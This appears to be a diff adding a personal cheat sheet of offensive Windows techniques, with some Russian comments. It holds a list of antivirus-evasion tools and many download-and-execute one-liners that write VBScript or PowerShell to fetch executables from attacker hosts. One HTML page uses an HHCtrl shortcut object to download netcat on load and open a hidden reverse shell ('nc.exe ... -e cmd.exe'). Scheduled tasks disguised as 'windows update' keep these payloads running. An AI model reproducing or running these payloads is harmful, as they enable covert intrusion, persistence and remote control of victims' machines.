@@ -1,0 +1,270 @@
+
+shellsploit - Generates custom shellcode, backdoors, injectors, optionally obfuscates every byte via encoders.
+Hyperion - Runtime encryptor for 32-bit portable executables ("PE .exes").
+AntiVirus Evasion Tool (AVET) - Post-process exploits containing executable files targeted for Windows machines to avoid being recognized by antivirus software.
+peCloak.py - Automates the process of hiding a malicious Windows executable from antivirus (AV) detection.
+peCloakCapstone - Multi-platform fork of the peCloak.py automated malware antivirus evasion tool.
+UniByAv - Simple obfuscator that takes raw shellcode and generates Anti-Virus friendly executables by using a brute-forcable, 32-bit XOR key.
+
+
+
+echo Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> C:\Users\Public\12.txt & echo oXMLHTTP.Open "GET", "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe", 0 >> C:\Users\Public\12.txt & echo oXMLHTTP.Send >> C:\Users\Public\12.txt & echo Set oADOStream = CreateObject("ADODB.Stream") >> C:\Users\Public\12.txt & echo oADOStream.Mode = 3 >> C:\Users\Public\12.txt & echo oADOStream.Type = 1 >> C:\Users\Public\12.txt & echo oADOStream.Open >> C:\Users\Public\12.txt & echo oADOStream.Write oXMLHTTP.responseBody >> C:\Users\Public\12.txt & echo oADOStream.SaveToFile "C:\Users\Public\putty.exe", 2 >> C:\Users\Public\12.txt & echo dim path, WshShell >> C:\Users\Public\12.txt & echo path = "C:\Users\Public\" >> C:\Users\Public\12.txt & RENAME C:\Users\Public\12.txt 123.vbs & TIMEOUT 10 & start C:\Users\Public\123.vbs & start SCHTASKS /Create /SC MINUTE /MO 1  /ST 23:07 /ET 23:15 /TN Neo /TR C:\Users\Public\putty.exe
+
+
+',cmd.exe,/c echo Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> C:\Users\Public\12.txt & echo oXMLHTTP.Open "GET", "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe", 0 >> C:\Users\Public\12.txt & echo oXMLHTTP.Send >> C:\Users\Public\12.txt & echo Set oADOStream = CreateObject("ADODB.Stream") >> C:\Users\Public\12.txt & echo oADOStream.Mode = 3 >> C:\Users\Public\12.txt & echo oADOStream.Type = 1 >> C:\Users\Public\12.txt & echo oADOStream.Open >> C:\Users\Public\12.txt & echo oADOStream.Write oXMLHTTP.responseBody >> C:\Users\Public\12.txt & echo oADOStream.SaveToFile "C:\Users\Public\putty.exe", 2 >> C:\Users\Public\12.txt & echo dim path, WshShell >> C:\Users\Public\12.txt & echo path = "C:\Users\Public\" >> C:\Users\Public\12.txt & RENAME C:\Users\Public\12.txt 123.vbs & echo WScript.Sleep(5000) >> C:\Users\Public\start.vbs & echo Set objShell = WScript.CreateObject("WScript.Shell") >> C:\Users\Public\start.vbs & echo objShell.Run("C:\Users\Public\putty.exe"), 0, True >> C:\Users\Public\start.vbs & echo WScript.Sleep(10000) >> C:\Users\Public\rstart.vbs & echo Set objShell = WScript.CreateObject("WScript.Shell") >> C:\Users\Public\rstart.vbs & echo objShell.Run("C:\Users\Public\123.vbs"), 0, True >> C:\Users\Public\rstart.vbs & echo WScript.Sleep(10000) >> C:\Users\Public\rstart.vbs & echo Set objShell = WScript.CreateObject("WScript.Shell") >> C:\Users\Public\rstart.vbs & echo objShell.Run("C:\Users\Public\start.vbs"), 0, True >> C:\Users\Public\rstart.vbs & echo WScript.Sleep(10000) >> C:\Users\Public\rstart.vbs & echo Set objShell = WScript.CreateObject("WScript.Shell") >> C:\Users\Public\rstart.vbs & echo objShell.Run("C:\Users\Public\start.vbs"), 0, True >> C:\Users\Public\rstart.vbs & echo WScript.Sleep(10000) >> C:\Users\Public\rstart.vbs & echo Set objShell = WScript.CreateObject("WScript.Shell") >> C:\Users\Public\rstart.vbs & echo objShell.Run("C:\Users\Public\start.vbs"), 0, True >> C:\Users\Public\rstart.vbs & start C:\Users\Public\rstart.vbs'
+
+
+C:\Windows\System32\schtasks.exe /CREATE /SC DAILY /TN "MyTask" /TR "C:\Users\putty.exe" /ST 12:20   создать задачу)ы
+
+TFTP
+# Windows XP and Win 2003 contain tftp client. Windows 7 do not by default 
+# tfpt clients are usually non-interactive, so they could work through an obtained shell 
+
+atftpd --daemon --port 69 /tftp
+Windows> tftp -i 192.168.30.45 GET nc.exe
+
+--------------------------------------
+
+FTP (pyftpdlib client on Kali)
+# Ftp is generally installed on Windows machines
+# To make it interactive, use -s option
+
+# On Kali install a ftp client and set a username/password
+apt-get install python-pyftpdlib  
+python -m pyftpdlib -p 21
+
+# on Windows
+ftp <attackerip>
+> binary
+> get exploit.exe
+
+-------------------------------------------
+
+FTP (pureftpd client on Kali)
+
+# on Kali
+
+# install ftp client
+apt-get install pure-ftpd
+# create a group
+groupadd ftpgroup
+# add a user
+useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+# Create a directory for your ftp-files (you can also specify a specific user e.g.: /root/ftphome/bob).
+mkdir /root/ftphome
+# Create a ftp-user, in our example "bob" (again you can set "-d /root/ftphome/bob/" if you wish).
+pure-pw useradd bob -u ftpuser -g ftpgroup -d /root/ftphome/
+# Update the ftp database after adding our new user.
+pure-pw mkdb
+# change ownership of the specified ftp directory (and all it's sub-direcotries) 
+chown -R ftpuser:ftpgroup /root/ftphome
+# restart Pure-FTPD
+/etc/init.d/pure-ftpd restart
+
+
+# On Windows
+echo open <attackerip> 21> ftp.txt
+echo USER username password >> ftp.txt
+echo bin >> ftp.txt
+echo GET evil.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -s:ftp.txt
+
+--------------------------------------
+
+Powershell
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://<attackerip>/powerup.ps1" >>wget.ps1
+echo $file = "powerup.ps1" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
+--------------------------------------
+# Powershell download a file
+powershell "IEX(New Object Net.WebClient).downloadString('http://<targetip>/file.ps1')"
+
+NETCAT
+
+<html>
+<title> Предложение </title>
+<head>
+</head>
+<body>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+<OBJECT id=shortcut classid="clsid:52a2aaae-085d-4187-97ea-8c30db990436" width=100 height=100>
+<PARAM name="Command" value="ShortCut">
+<PARAM name="Button" value="Bitmap:shortcut">
+<PARAM name="Item1" value=',cmd.exe,/c echo Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> C:\Users\Public\123.vbs & echo oXMLHTTP.Open "GET", "http://192.168.1.39/curl.exe", 0 >> C:\Users\Public\123.vbs & echo oXMLHTTP.Send >> C:\Users\Public\123.vbs & echo Set oADOStream = CreateObject("ADODB.Stream") >> C:\Users\Public\123.vbs & echo oADOStream.Mode = 3 >> C:\Users\Public\123.vbs & echo oADOStream.Type = 1 >> C:\Users\Public\123.vbs & echo oADOStream.Open >> C:\Users\Public\123.vbs & echo oADOStream.Write oXMLHTTP.responseBody >> C:\Users\Public\123.vbs & echo oADOStream.SaveToFile "C:\Users\Public\curl.exe", 2 >> C:\Users\Public\123.vbs & echo dim path, WshShell >> C:\Users\Public\123.vbs & echo path = "C:\Users\Public\" >> C:\Users\Public\123.vbs && start C:\Users\Public\123.vbs && echo WScript.Sleep(5000) >> C:\Users\Public\p.vbs & echo Set objShell = WScript.CreateObject("WScript.Shell") >> C:\Users\Public\p.vbs & echo objShell.Run("C:\Users\Public\curl.exe --output C:\ProgramData\nc.exe http://192.168.1.39/nc.exe") >> C:\Users\Public\p.vbs && start C:\Users\Public\p.vbs & echo WScript.Sleep(10000) >> C:\Users\Public\cat.vbs & echo Set objShell = WScript.CreateObject("WScript.Shell") >> C:\Users\Public\cat.vbs & echo objShell.Run("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w Hidden C:\ProgramData\nc.exe 192.168.1.49 443 -e cmd.exe") >> C:\Users\Public\cat.vbs && start C:\Users\Public\cat.vbs & C:\Windows\System32\schtasks.exe /CREATE /SC DAILY /TN "microsoft\windows update" /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w Hidden C:\ProgramData\nc.exe 192.168.1.49 443 -e cmd.exe" /ST 11:35'
+<PARAM name="Item2" value="273,1,1">
+</OBJECT>
+<SCRIPT>
+shortcut.Click();
+</SCRIPT>
+
+
+</div>
+</body>
+</html>
+
+
+
+KOADIK
+
+echo Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> C:\Users\Public\123.vbs & echo oXMLHTTP.Open "GET", "http://192.168.1.39/curl.exe", 0 >> C:\Users\Public\123.vbs & echo oXMLHTTP.Send >> C:\Users\Public\123.vbs & echo Set oADOStream = CreateObject("ADODB.Stream") >> C:\Users\Public\123.vbs & echo oADOStream.Mode = 3 >> C:\Users\Public\123.vbs & echo oADOStream.Type = 1 >> C:\Users\Public\123.vbs & echo oADOStream.Open >> C:\Users\Public\123.vbs & echo oADOStream.Write oXMLHTTP.responseBody >> C:\Users\Public\123.vbs & echo oADOStream.SaveToFile "C:\Users\Public\curl.exe", 2 >> C:\Users\Public\123.vbs & echo dim path, WshShell >> C:\Users\Public\123.vbs & echo path = "C:\Users\Public\" >> C:\Users\Public\123.vbs && start C:\Users\Public\123.vbs 
+&& echo WScript.Sleep(5000) >> C:\Users\Public\dcat.vbs 
+& echo Set objShell = WScript.CreateObject("WScript.Shell") >> C:\Users\Public\dcat.vbs 
+& echo objShell.Run("C:\Users\Public\curl.exe --output C:\Users\Public\nc.exe http://192.168.1.39/nc.txt") >> C:\Users\Public\dcat.vbs
+ 
+&& echo WScript.Sleep(5000) >> C:\Users\Public\dhta.vbs 
+& echo Set objShell = WScript.CreateObject("WScript.Shell") >> C:\Users\Public\dhta.vbs 
+& echo objShell.Run("C:\Users\Public\curl.exe --output C:\Users\Public\lv.hta http://192.168.1.39/lv.hta") >> C:\Users\Public\dhta.vbs 
+
+&& echo WScript.Sleep(5000) >> C:\Users\Public\hta.vbs 
+& echo Set objShell = WScript.CreateObject("WScript.Shell") >> C:\Users\Public\hta.vbs 
+& echo objShell.Run("C:\Users\Public\curl.exe --output C:\Users\Public\lv.hta http://192.168.1.39/lv.hta") >> C:\Users\Public\hta.vbs
+
+&& echo WScript.Sleep(50000) >> C:\Users\Public\shta.vbs 
+& echo Set objShell = WScript.CreateObject("WScript.Shell") >> C:\Users\Public\shta.vbs 
+& echo objShell.Run("mshta C:\Users\Public\lv.hta") >> C:\Users\Public\shta.vbs
+
+
+&& start C:\Users\Public\dcat.vbs & start C:\Users\Public\dhta.vbs & start C:\Users\Public\hta.vbs & start C:\Users\Public\shta.vbs
+& C:\Windows\System32\schtasks.exe /CREATE /SC DAILY /TN "microzoft\windows update" /TR "mshta C:\Users\Public\lv.hta" /ST 11:35
+& C:\Windows\System32\schtasks.exe /CREATE /SC DAILY /TN "microzoft\windowz" /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w Hidden C:\Users\Public\nc.exe 192.168.1.49 443 -e cmd.exe" /ST 14:35
+& C:\Windows\System32\schtasks /create /sc minute /mo 300 /tn "WinUP" /TR "C:\Users\Public\curl.exe --output C:\Users\Public\lv.hta http://192.168.1.39/lv.hta"
+
+htm2chm
+
+https://www.browserling.com/tools/utf8-encode
+
+<html>
+<script>document.write('');</script>
+</html>
+
+
+
+https://www.securitylab.ru/contest/384245.php?R=1
+
+C:\Users\Ondrik8\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+C:\Users\Имя_пользователя\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+
+
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs 
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
+echo Err.Clear >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET",strURL,False >> wget.vbs
+echo http.Send >> wget.vbs
+echo varByteArray = http.ResponseBody >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
+echo Next >> wget.vbs
+echo ts.Close >> wget.vbs
+
+
+#After you've created wget.vbs
+cscript wget.vbs http://192.168.10.5/evil.exe evil.exe
+
+_____________________________________________________________________
+
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://192.168.1.101/file.exe" >>wget.ps1
+echo $file = "output-file.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
+_______________________________________________________________________
+
+doskey /exename=cmd.exe dir=calc.exe    введи в цмд) а потом dir
+
+//wget.js - similar to wget but written in vbscript
+//based on a script by Chrissy LeMaire
+//forked by Bit
+
+var shell = new ActiveXObject("WScript.shell");
+
+//Usage
+if (WScript.Arguments.length < 1) {
+  shell.Popup("Usage: wget.js <url> (file)");
+  WScript.Quit();
+}
+
+//Arguments
+var url = WScript.Arguments(0);
+if (WScript.Arguments.length > 1) {
+  var saveTo = WScript.Arguments(1);
+} else {
+  parts = url.split("/");
+  var saveTo = parts.slice(0, parts.length - 1);
+}
+
+//Fetch the file
+var xhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
+
+xhr.open("GET", url, false);
+xhr.send();
+
+if (xhr.status === 200) {
+  var stream = new ActiveXObject("ADODB.Stream");
+  stream.Open();
+  stream.Type = 1; //adTypeBinary
+  
+  stream.Write(xhr.responseBody);
+  stream.Position = 0; //Set the stream position to the start
+  
+  var explorer = new ActiveXObject("Scripting.FileSystemObject");
+  if (explorer.Fileexists(saveTo)) { explorer.DeleteFile(saveTo); }
+  
+  stream.SaveToFile(saveTo);
+  stream.Close();
+}
+
+//Done
+WScript.Quit();
+
+
+ echo Set args = Wscript.Arguments  &gt;&gt; webdl.vbs
+ timeout 1
+ echo Url = "http://1.1.1.1/windows-privesc-check2.exe"  &gt;&gt; webdl.vbs
+ timeout 1
+ echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  &gt;&gt; webdl.vbs
+ timeout 1
+ echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  &gt;&gt; webdl.vbs
+ timeout 1
+ echo xHttp.Open "GET", Url, False  &gt;&gt; webdl.vbs
+ timeout 1
+ echo xHttp.Send  &gt;&gt; webdl.vbs
+ timeout 1
+ echo with bStrm      &gt;&gt; webdl.vbs
+ timeout 1
+ echo   .type = 1 '      &gt;&gt; webdl.vbs
+ timeout 1
+ echo   .open      &gt;&gt; webdl.vbs
+ timeout 1
+ echo   .write xHttp.responseBody      &gt;&gt; webdl.vbs
+ timeout 1
+ echo   .savetofile "C:tempwindows-privesc-check2.exe", 2 '  &gt;&gt; webdl.vbs
+ timeout 1
+ echo end with &gt;&gt; webdl.vbs
+ timeout 1
+ echo
+
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs & echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs & echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs & echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs & echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs & echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs & echo Err.Clear >> wget.vbs & echo Set http = Nothing >> wget.vbs & echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs & echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs & echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs & echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs & echo http.Open "GET",strURL,False >> wget.vbs & echo http.Send >> wget.vbs & echo varByteArray = http.ResponseBody >> wget.vbs & echo Set http = Nothing >> wget.vbs & echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs & echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs & echo strData = "" >> wget.vbs & echo strBuffer = "" >> wget.vbs & echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs & echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs & echo Next >> wget.vbs & echo ts.Close >> wget.vbs
